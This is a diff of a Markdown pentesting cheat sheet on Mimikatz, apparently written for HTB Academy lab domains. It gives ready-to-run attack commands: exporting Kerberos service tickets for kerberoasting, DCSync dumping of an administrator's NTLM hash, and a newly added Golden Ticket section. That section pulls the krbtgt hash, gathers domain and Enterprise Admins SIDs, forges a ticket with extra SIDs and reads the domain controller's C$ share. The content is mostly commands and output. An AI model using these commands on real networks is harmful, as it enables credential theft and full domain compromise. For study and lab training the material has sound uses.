@@ -5,6 +5,7 @@ tags:
   - PtT
   - kerberoasting
   - dcsync
+  - sid-abuse
 ---
 # Modules
 ## Logon Passwords
@@ -50,9 +51,9 @@ PS > Enter-PSSession -ComputerName DC01
 # Kerberoasting
 ## Extract TGS Ticket from Memory
 If the TGS ticket is in memory (from [[SetSPN]] for example), extract it:
-```cmd-session
-mimikatz # base64 /out:true
-mimikatz # kerberos::list /export
+```Powershell
+mimikatz > base64 /out:true
+mimikatz > kerberos::list /export
 
 <SNIP>
 [00000002] - 0x00000017 - rc4_hmac_nt      
@@ -66,7 +67,6 @@ Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local
 doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADAgEFoRUbE0lOTEFO
 RUZSRUlHSFQuTE9DQUyiOzA5oAMCAQKhMjAwGwhNU1NRTFN2YxskREVWLVBSRS1T
 <SNIP>
-32UeFiVp60IcdOjV4Mwan6tYpLm2O6uwnvw0J+Fmf5x3Mbyr42RZhgQKcwaSTfXm
 LkxPQ0FMqTswOaADAgECoTIwMBsITVNTUUxTdmMbJERFVi1QUkUtU1FMLmlubGFu
 ZWZyZWlnaHQubG9jYWw6MTQzMw==
 ====================
@@ -94,6 +94,7 @@ Mimikatz must be ran in the context of the user who has DCSync privileges and on
 ```cmd-shell
 > runas /netonly /user:INLANEFREIGHT\adunn powershell
 ```
+
 ```powershell
 PS > .\mimikatz.exe
 mimikatz # privilege::debug
@@ -102,5 +103,21 @@ mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\admin
 	NTLM: <NTLM-HASH>
 ... SNIP ...
 ```
-
-
+# Golden Ticket
+- Obtain the KRBTGT Account's NT Hash:
+```powershell
+mimikatz > lsadump::dcsync /user:LOGISTICS\krbtgt
+```
+- Get current child domain SID using [[PowerView#[Get-DomainSID](https //powersploit.readthedocs.io/en/latest/Recon/Get-DomainSID/)|Get-DomainSID]]
+- Get SID for Enterprise Admins group in the parent domain either with [[ActiveDirectory#[Get-ADGroup](https //docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps)|Get-ADGroup]] or [[PowerView#[Get-DomainGroup](https //powersploit.readthedocs.io/en/latest/Recon/Get-DomainGroup/)|Get-DomainGroup]]
+```powershell
+PS > Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
+```
+- Request a Golden Ticket:
+```powershell
+mimikatz > kerberos::golden /user:hacker /domain:<CHILD-DOMAIN-FQDN> /sid:<CHILD-DOMAIN-SID> /krbtgt:<KTBTGT> /sids:<ROOT-DOMAIN-ENTERPRISE-ADMIN-SID> /ptt
+```
+The ticket can be confirmed with [[klist]]. And if the attack is successful, we should be able to read DC's whole C drive!
+```powershell
+PS > ls \\academy-ea-dc01.inlanefreight.local\c$
+```
